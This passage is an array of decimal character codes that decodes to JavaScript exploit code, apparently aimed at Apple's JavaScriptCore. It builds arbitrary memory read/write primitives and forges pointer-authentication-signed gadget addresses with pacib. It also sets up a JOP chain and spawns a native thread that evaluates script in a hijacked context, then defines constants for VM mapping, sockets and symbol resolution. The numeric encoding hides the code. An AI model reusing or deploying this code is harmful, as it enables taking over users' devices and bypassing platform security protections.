101, 100, 95, 97, 114, 114, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 98, 111, 120, 101, 100, 95, 97, 114, 114, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 98, 117, 116, 116, 101, 114, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 56, 110, 44, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 98, 117, 116, 116, 101, 114, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 114, 119, 54, 52, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 114, 119, 56, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 105, 103, 110, 105, 110, 103, 95, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 61, 32, 48, 120, 52, 57, 49, 49, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 105, 103, 110, 101, 100, 95, 102, 99, 97, 108, 108, 95, 97, 100, 100, 114, 32, 61, 32, 112, 97, 99, 105, 98, 40, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 44, 32, 115, 105, 103, 110, 105, 110, 103, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 110, 97, 110, 95, 99, 111, 100, 101, 95, 112, 116, 114, 44, 32, 115, 105, 103, 110, 101, 100, 95, 102, 99, 97, 108, 108, 95, 97, 100, 100, 114, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 100, 100, 114, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 109, 101, 109, 99, 112, 121, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 44, 32, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 44, 32, 80, 65, 71, 69, 95, 83, 73, 90, 69, 41, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 51, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 53, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 54, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 55, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 41, 59, 10, 10, 32, 32, 32, 32, 105, 102, 32, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 61, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 115, 105, 103, 110, 97, 116, 117, 114, 101, 32, 61, 32, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 40, 99, 116, 120, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 32, 32, 32, 61, 32, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 40, 105, 110, 118, 111, 107, 101, 95, 99, 108, 97, 115, 115, 44, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 115, 105, 103, 110, 97, 116, 117, 114, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 41, 44, 32, 49, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 99, 116, 120, 41, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 44, 32, 50, 110, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 32, 61, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 40, 110, 115, 116, 104, 114, 101, 97, 100, 95, 99, 108, 97, 115, 115, 41, 59, 10, 32, 32, 32, 32, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 40, 110, 115, 116, 104, 114, 101, 97, 100, 44, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 107, 101, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 40, 110, 115, 116, 104, 114, 101, 97, 100, 41, 59, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 116, 104, 114, 101, 97, 100, 95, 104, 97, 110, 100, 108, 101, 34, 32, 58, 32, 110, 115, 116, 104, 114, 101, 97, 100, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 95, 99, 116, 120, 34, 32, 58, 32, 99, 116, 120, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 34, 32, 58, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 34, 32, 58, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 125, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 40, 106, 115, 95, 116, 104, 114, 101, 97, 100, 41, 10, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 95, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 115, 95, 99, 116, 120, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 116, 104, 114, 101, 97, 100, 95, 104, 97, 110, 100, 108, 101, 34, 93, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 119, 97, 105, 116, 32, 117, 110, 116, 105, 108, 32, 116, 104, 101, 32, 116, 104, 114, 101, 97, 100, 32, 105, 115, 32, 102, 105, 110, 105, 115, 104, 101, 100, 32, 97, 110, 100, 32, 114, 101, 108, 101, 97, 115, 101, 32, 105, 116, 10, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 116, 114, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 61, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 110, 115, 116, 104, 114, 101, 97, 100, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 61, 61, 32, 49, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 98, 114, 101, 97, 107, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 110, 115, 116, 104, 114, 101, 97, 100, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 118, 101, 114, 116, 32, 114, 119, 54, 52, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 118, 101, 114, 116, 32, 114, 119, 56, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 108, 101, 97, 115, 101, 32, 106, 115, 32, 99, 111, 110, 116, 101, 120, 116, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 99, 95, 114, 101, 102, 95, 99, 111, 117, 110, 116, 32, 61, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 40, 106, 115, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 102, 111, 114, 32, 40, 108, 101, 116, 32, 105, 32, 61, 32, 48, 110, 59, 32, 105, 32, 60, 32, 106, 115, 99, 95, 114, 101, 102, 95, 99, 111, 117, 110, 116, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 106, 115, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 108, 101, 97, 115, 101, 32, 116, 97, 114, 103, 101, 116, 32, 106, 115, 32, 115, 99, 114, 105, 112, 116, 10, 32, 32, 32, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 102, 114, 101, 101, 32, 106, 111, 112, 32, 99, 104, 97, 105, 110, 32, 112, 114, 111, 112, 101, 114, 116, 105, 101, 115, 10, 32, 32, 32, 32, 102, 114, 101, 101, 40, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 93, 41, 59, 10, 125, 10, 108, 101, 116, 32, 82, 84, 76, 68, 95, 68, 69, 70, 65, 85, 76, 84, 32, 61, 32, 48, 120, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 69, 110, 59, 10, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 65, 78, 89, 87, 72, 69, 82, 69, 32, 61, 32, 49, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 70, 73, 88, 69, 68, 32, 61, 32, 48, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 79, 86, 69, 82, 87, 82, 73, 84, 69, 32, 61, 32, 48, 120, 52, 48, 48, 48, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 82, 65, 78, 68, 79, 77, 95, 65, 68, 68, 82, 32, 61, 32, 56, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 73, 78, 72, 69, 82, 73, 84, 95, 78, 79, 78, 69, 32, 61, 32, 50, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 32, 61, 32, 51, 110, 59, 10, 10, 108, 101, 116, 32, 80, 82, 79, 84, 95, 82, 69, 65, 68, 32, 61, 32, 48, 120, 49, 110, 59, 10, 108, 101, 116, 32, 80, 82, 79, 84, 95, 87, 82, 73, 84, 69, 32, 61, 32, 48, 120, 50, 110, 59, 10, 10, 108, 101, 116, 32, 77, 65, 80, 95, 83, 72, 65, 82, 69, 68, 32, 61, 32, 48, 120, 49, 110, 59, 10, 10, 108, 101, 116, 32, 65, 70, 95, 73, 78, 69, 84, 54, 32, 61, 32, 51, 48, 110, 59, 10, 108, 101, 116, 32, 83, 79, 67, 75, 95, 68, 71, 82, 65, 77, 32, 61, 32, 50, 110, 59, 10, 108, 101, 116, 32, 73, 80, 80, 82, 79, 84, 79, 95, 73, 67, 77, 80, 86, 54, 32, 61, 32, 53, 56, 110, 59, 10, 108, 101, 116, 32, 73, 67, 77, 80, 54, 95, 70, 73, 76, 84, 69, 82, 32, 61, 32, 49, 56, 110, 59, 10, 10, 108, 101, 116, 32, 83, 69, 69, 75, 95, 83, 69, 84, 32, 61, 32, 48, 110, 59, 10, 10, 108, 101, 116, 32, 95, 78, 83, 71, 69, 84, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 80, 65, 84, 72, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 95, 78, 83, 71, 101, 116, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 80, 97, 116, 104, 34, 41, 59, 10, 108, 101, 116, 32, 65, 67, 67, 69, 83, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 97, 99, 99, 101, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 67, 79, 78, 70, 83, 84, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 111, 110, 102, 115, 116, 114, 34, 41, 59, 10, 108, 101, 116, 32, 70, 67, 78, 84, 76, 32, 61, 32, 102, 117, 110, 99, 95, 